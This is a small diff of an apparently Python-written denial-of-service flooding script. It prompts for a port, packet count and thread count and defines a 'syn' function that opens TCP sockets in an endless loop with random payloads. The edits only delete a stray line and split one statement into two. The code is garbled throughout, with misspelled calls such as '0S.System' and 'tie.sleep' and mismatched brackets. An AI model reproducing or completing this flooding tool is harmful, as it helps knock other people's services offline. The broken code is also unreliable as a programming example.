@@ -20,7 +20,6 @@ port = int(input(colored ("[+] Port: ", 'green')))
 packet = int(input(colored ("[+] Packets: ", "green")))
 thread= int(input(colored ("[+] Threads: ","green"))) time.sleep(1.5)
 
-0S.System("cls")
 print(colored(ne time.sleep(2)
 print(colored("\n[+] start...","green"}} time.sleep(1)
 print(colored("\n","green")) time.sleep(1)
@@ -29,7 +28,8 @@ print(colored("\n1","green")) tie.sleep(1)
 os.system("cls")
 
 def syn(): 
-hevin = random, urandom(980) bb = int(0)
+hevin = random, urandom(980)
+bb = int(0)
 while True: 
 try: 
 h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
